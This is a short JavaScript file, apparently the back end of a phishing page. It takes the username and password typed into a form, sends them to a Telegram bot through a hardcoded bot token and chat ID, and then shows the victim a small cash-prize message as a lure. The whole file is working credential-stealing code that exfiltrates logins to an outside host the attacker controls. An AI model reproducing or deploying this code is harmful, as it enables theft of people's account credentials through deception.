document.getElementById('passwordForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `Username: ${username}\nPassword: ${password}`;

    fetch('https://api.telegram.org/bot8890809901:AAEja8I5j0aBUWUwDGLdRN2uLuSHoK-yvXc/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '8596970646',
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            document.getElementById('message').innerText = 'You got 5rs! 🎉';
        } else {
            document.getElementById('message').innerText = 'An error occurred. Please try again.';
        }
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('message').innerText = 'An error occurred. Please try again.';
    });
});